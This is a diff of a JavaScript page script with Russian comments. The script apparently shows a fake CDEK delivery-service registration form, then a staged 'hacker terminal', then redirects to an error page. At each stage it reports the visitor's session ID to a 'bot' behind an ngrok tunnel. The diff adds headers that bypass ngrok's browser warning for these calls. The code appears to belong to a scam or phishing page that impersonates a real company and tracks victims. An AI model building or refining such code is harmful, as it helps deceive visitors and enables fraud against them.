@@ -61,31 +61,28 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // --- СЦЕНАРИЙ ДЕЙСТВИЙ ---
-
-    // 1. Инициализация (1.2 сек)
     setTimeout(() => {
         if (sitePreloader) {
             sitePreloader.classList.add('hidden');
         }
 
-        // 2. Отображение формы регистрации СДЭК на протяжении 2 секунд
         setTimeout(() => {
-            
-            // 3. Появление терминала и вывод логов
             if (hackerModal) {
                 hackerModal.classList.add('visible');
                 
                 // --- ОТПРАВЛЯЕМ СИГНАЛ В БОТА: ЭТАП 2 ---
                 fetch('https://runaround-defiance-unmasked.ngrok-free.dev/api/stage2', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'ngrok-skip-browser-warning': 'true' // <--- ЭТО РЕШАЕТ ВСЁ
+                    },
                     body: JSON.stringify({ sessionId: localStorage.getItem('sessionId') })
                 }).catch(err => console.error(err));
                 
                 runHackerTerminal(() => {
                     hackerModal.classList.remove('visible');
 
-                    // 4. Показ анимированного экрана перенаправления
                     setTimeout(() => {
                         if (profileLoaderOverlay) {
                             profileLoaderOverlay.classList.add('visible');
@@ -94,11 +91,13 @@ document.addEventListener('DOMContentLoaded', () => {
                         // --- ОТПРАВЛЯЕМ СИГНАЛ В БОТА: ЭТАП 3 ---
                         fetch('https://runaround-defiance-unmasked.ngrok-free.dev/api/success', {
                             method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
+                            headers: { 
+                                'Content-Type': 'application/json',
+                                'ngrok-skip-browser-warning': 'true' // <--- И ЗДЕСЬ ТОЖЕ
+                            },
                             body: JSON.stringify({ sessionId: localStorage.getItem('sessionId') })
                         }).catch(err => console.error(err));
 
-                        // 5. Переход на итоговую страницу через 3 секунды
                         setTimeout(() => {
                             window.location.href = 'error.html';
                         }, 3000);
